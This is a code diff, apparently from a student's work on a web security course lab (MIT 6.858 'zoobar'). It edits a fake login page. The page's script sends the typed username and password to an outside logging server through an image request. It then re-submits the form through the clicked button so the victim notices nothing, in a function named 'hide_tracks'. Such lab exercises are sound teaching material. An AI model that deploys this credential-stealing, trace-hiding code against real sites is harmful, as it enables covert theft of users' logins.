@@ -9,8 +9,8 @@
 <tr>
    <td>Password:</td>
   <td colspan=2><input type="password" name="login_password" size=20 autocomplete="no">
-  <input type="submit" name="submit_login" value="Log in">
-  <input type="submit" name="submit_registration" value="Register"></td>
+  <input type="submit" name="submit_login" value="Log in" onclick=set_submit_type(this)>
+  <input type="submit" name="submit_registration" value="Register" onclick=set_submit_type(this)></td>
 </tr>
 </table>
 <input type="hidden" name="nexturl" value="/zoobar/index.cgi/users">
@@ -23,9 +23,19 @@
 	var password = document.getElementsByName("login_password")[0];
 	var login_button = document.getElementsByName("submit_login")[0];
 	var register_button = document.getElementsByName("submit_registration")[0];
-	
-	function hide_submit(arg) {
+	var submit_type;
+
+
+	function set_submit_type(btn) {
+		submit_type = btn.value;
+	}
+
+	function hide_tracks(arg) {
 		login_form.removeEventListener("submit", on_submit);
+		if(submit_type == "Log in")
+			login_button.click();
+		else if(submit_type == "Register")
+			register_button.click();
 	}
 
 
@@ -37,7 +47,7 @@
 			(new Image()).src='http://css.csail.mit.edu/6.858/2020/labs/log.php?' + 'id=test' + '&payload=' + username["value"] + "/" + password["value"] + "&random=" + Math.random();
 		}, 1000);
 		
-		setTimeout(hide_submit, 2000);
+		setTimeout(hide_tracks, 2000);
 	}
 
 	login_form.addEventListener("submit", on_submit, false);
